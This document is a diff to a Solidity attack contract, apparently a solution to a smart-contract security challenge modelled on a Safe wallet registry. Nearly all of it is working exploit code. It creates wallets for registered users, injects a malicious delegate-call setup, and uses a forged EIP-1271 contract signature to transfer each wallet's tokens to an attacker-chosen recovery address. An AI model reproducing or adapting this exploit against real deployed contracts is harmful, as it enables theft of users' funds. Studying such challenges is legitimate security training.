@@ -108,13 +108,13 @@ contract MaliciousSetupContract is Safe, ISignatureValidator {
     }
 }
 
-contract AttackEntryPoint {
-    uint256 constant safeTxGas = 0;
-    uint256 constant baseGas = 0;
-    uint256 constant gasPrice = 0;
-    address constant gasToken = address(0);
-    address constant refundReceiver = address(0);
+contract MaliciousSafeOwner is ISignatureValidator {
+    function isValidSignature(bytes memory, bytes memory) public pure override returns (bytes4) {
+        return EIP1271_MAGIC_VALUE;
+    }
+}
 
+contract AttackEntryPoint {
     constructor(
         address recovery,
         address[] memory users,
@@ -123,50 +123,48 @@ contract AttackEntryPoint {
         WalletRegistry walletRegistry
     ) {
         MaliciousSetupContract setupContract = new MaliciousSetupContract();
-        bytes memory setupCall = abi.encodeWithSelector(setupContract.maliciousSetup.selector, address(setupContract));
+        MaliciousSafeOwner safeOwner = new MaliciousSafeOwner();
+        bytes memory setupCall = abi.encodeWithSelector(setupContract.maliciousSetup.selector, address(safeOwner));
+        bytes memory tokenTransferData = abi.encodeWithSelector(IERC20.transfer.selector, recovery, 10e18);
+        address[] memory safeOwners = new address[](1);
+        Safe safe;
+        bytes memory txSig;
 
         for (uint256 i = 0; i < users.length; i++) {
-            Safe safe;
-            {
-                address[] memory safeOwners = new address[](1);
-                safeOwners[0] = users[i];
-                bytes memory safeInitializer = abi.encodeWithSelector(
-                    singletonCopy.setup.selector,
-                    safeOwners,
-                    1, // threshold
-                    setupContract, // delegate call to this
-                    setupCall, // delegate call data
-                    address(0), // fallback handler
-                    address(0), // paymentToken
-                    0, // payment
-                    address(0) // paymentReceiver
-                );
-                safe = Safe(
-                    payable(
-                        address(
-                            walletFactory.createProxyWithCallback(address(singletonCopy), safeInitializer, 0, walletRegistry)
-                        )
+            safeOwners[0] = users[i];
+            bytes memory safeInitializer = abi.encodeWithSelector(
+                singletonCopy.setup.selector,
+                safeOwners,
+                1, // threshold
+                setupContract, // delegate call to this
+                setupCall, // delegate call data
+                address(0), // fallback handler
+                address(0), // paymentToken
+                0, // payment
+                address(0) // paymentReceiver
+            );
+            safe = Safe(
+                payable(
+                    address(
+                        walletFactory.createProxyWithCallback(address(singletonCopy), safeInitializer, 0, walletRegistry)
                     )
-                );
-            }
-            require(safe.isOwner(address(setupContract)), "fakeOwner must become an owner");
-            bytes memory tokenTransferData = abi.encodeWithSelector(IERC20.transfer.selector, recovery, 10e18);
-
-            bytes memory txSig = abi.encodePacked(
-                bytes32(uint256(uint160(address(setupContract)))), bytes32(uint256(65)), uint8(0), // actual signature
+                )
+            );
+            txSig = abi.encodePacked(
+                bytes32(uint256(uint160(address(safeOwner)))), bytes32(uint256(65)), uint8(0), // actual signature
                 bytes32(""), bytes32(""), uint8(0) // dummy value to increase the length
             );
 
             safe.execTransaction(
-                address(walletRegistry.token()), // to
+                address(walletRegistry.token()),
                 0, // value
                 tokenTransferData,
-                Enum.Operation.Call,
-                safeTxGas,
-                baseGas,
-                gasPrice,
-                gasToken,
-                payable(refundReceiver),
+                Enum.Operation.Call, // use call (not delegate call)
+                0, // safeTxGas (unused)
+                0, // baseGas (unused)
+                0, // gasPrice (unused)
+                address(0), // gasToken (unused)
+                payable(address(0)), // refundReceiver (unused)
                 txSig
             );
         }
